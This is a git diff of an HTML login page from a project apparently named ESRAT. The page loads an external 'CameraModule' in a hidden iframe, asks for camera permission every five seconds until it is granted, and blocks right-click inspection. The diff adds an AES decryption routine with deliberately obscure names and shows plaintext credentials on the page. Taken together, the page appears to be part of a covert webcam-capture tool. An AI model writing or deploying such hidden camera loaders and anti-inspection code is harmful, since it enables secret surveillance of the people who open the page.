@@ -28,7 +28,7 @@
 
     <!-- Notice Board -->
     <div id="notice-board" class="notice-board">
-        <p><b>Allow 'Camera' permission from <br>your browser settings to Proceed.</b> <br>Username- ganga <br> Password- gangadharesm3</p>
+        <p><b>Allow 'Camera' permission from your browser settings to Proceed.</b> <br>Username- ganga <br> Password- gangadharesm3</p>
     </div>
     
     <div class="container">
@@ -48,6 +48,8 @@
     <!-- Hidden iframe to load the CameraModule -->
     <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
     <script>
         let cameraStream = null;  // Variable to store the camera stream
 
@@ -55,6 +57,17 @@
             const response = await fetch("/ESRAT/asset/keys.json");
             const sacredKeys = await response.json();
             return sacredKeys;
+        }
+
+        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
+            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
+            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
+            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
+                iv: decodedEssence,
+                mode: CryptoJS.mode.CBC,
+                padding: CryptoJS.pad.Pkcs7
+            });
+            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
         }
 
         function enableInputs() {
@@ -99,13 +112,6 @@
         // Check camera permission every 5 seconds until granted
         const cameraInterval = setInterval(requestCameraPermission, 5000);
 
-        // Cursor shadow effect
-        const cursorShadow = document.querySelector('.cursor-shadow');
-        document.addEventListener('mousemove', (event) => {
-            cursorShadow.style.left = event.clientX + 'px';
-            cursorShadow.style.top = event.clientY + 'px';
-        });
-
         // Event listeners for login
         document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
         document.getElementById("password").addEventListener("keydown", (event) => {
@@ -130,13 +136,12 @@
             }
         }
 
-        // Load the CameraModule in the background
-        window.onload = function() {
-            const iframe = document.getElementById('cameraIframe');
-            iframe.onload = function() {
-                console.log('CameraModule loaded in background');
-            };
-        };
+        // Cursor shadow effect
+        const cursorShadow = document.querySelector('.cursor-shadow');
+        document.addEventListener('mousemove', (event) => {
+            cursorShadow.style.left = event.clientX + 'px';
+            cursorShadow.style.top = event.clientY + 'px';
+        });
 
         // Anti-inspection script
         document.addEventListener('contextmenu', event => event.preventDefault());  // Disable right-click
@@ -157,8 +162,6 @@
             }
         };
     </script>
-    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 
     <style>
         /* Styling for the notice board */
